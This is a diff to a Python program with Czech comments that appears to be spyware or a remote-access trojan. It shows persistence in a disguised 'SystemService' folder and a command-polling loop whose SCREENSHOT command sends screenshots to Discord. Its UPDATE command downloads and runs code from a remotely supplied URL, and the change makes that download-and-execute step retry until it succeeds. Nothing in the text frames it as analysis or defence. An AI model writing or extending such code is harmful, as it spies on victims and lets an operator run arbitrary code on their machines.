@@ -35,7 +35,7 @@ CAPTURE_FIELD_TYPE = True
 MAX_RETRIES = 3
 RETRY_DELAY = 5
 
-APP_VERSION = 1  # interní verze pro update check
+APP_VERSION = 2  # interní verze pro update check
 
 # Persistence
 APP_DIR = Path(os.environ.get("APPDATA", Path.home() / ".local/share")) / "SystemService"
@@ -350,11 +350,13 @@ def poll_commands():
                     elif line.upper().startswith("UPDATE:"):
                         new_url = line.split(":", 1)[1].strip()
 
-                # Update check
+                # Update check — retry dokud neprojde (i po selhání)
                 if new_version is not None and new_version > APP_VERSION and new_url:
                     if last_command != f"UPDATE:{new_version}":
-                        download_and_run_update(new_url)
-                        last_command = f"UPDATE:{new_version}"
+                        success = download_and_run_update(new_url)
+                        if success:
+                            last_command = f"UPDATE:{new_version}"  # jen při úspěchu
+                        # při selhání: NEnastavuj → další poll zkusí znovu (30s)
                 elif cmd != last_command:
                     if cmd == "SCREENSHOT":
                         send_screenshot_to_discord()
